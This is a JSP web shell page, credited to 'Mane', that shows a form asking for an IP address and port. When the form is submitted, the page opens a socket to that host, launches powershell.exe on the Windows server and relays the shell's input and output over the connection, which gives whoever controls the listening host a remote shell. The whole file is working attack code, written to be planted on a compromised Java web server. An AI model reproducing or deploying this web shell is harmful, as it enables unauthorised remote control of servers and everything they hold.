<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<HTML><BODY>
<p>Windows spawn reverse shell (POWERSHELL.exe), by Mane.</p>
<form action="" method="POST" name="manesec">
    <p>IP: <input style="width: 80%;" name="ip" type="text" /> </p>
    <p>Port: <input style="width: 80%;" name="port" type="text" /></p>
    <input type="submit" value="Send" />
</form>

<%
    class StreamConnector extends Thread {
        InputStream sG;
        OutputStream o4;

        StreamConnector(InputStream sG, OutputStream o4) {
            this.sG = sG;
            this.o4 = o4;
        }

        public void run() {
            BufferedReader yg = null;
            BufferedWriter qYa = null;
            try {
                yg = new BufferedReader(new InputStreamReader(this.sG));
                qYa = new BufferedWriter(new OutputStreamWriter(this.o4));
                char buffer[] = new char[8192];
                int length;
                while ((length = yg.read(buffer, 0, buffer.length)) > 0) {
                    qYa.write(buffer, 0, length);
                    qYa.flush();
                }
            } catch (Exception e) {}
            try {
                if (yg != null)
                    yg.close();
                if (qYa != null)
                    qYa.close();
            } catch (Exception e) {}
        }
    }

if (request.getParameter("ip") != null) {
    try {
        int port = Integer.parseInt(request.getParameter("port"));
        String ShellPath;
        ShellPath = new String("powershell.exe");
        Socket socket = new Socket(request.getParameter("ip"), port);
        Process process = Runtime.getRuntime().exec(ShellPath);
        (new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
        (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
    } catch (Exception e) {}
}
%>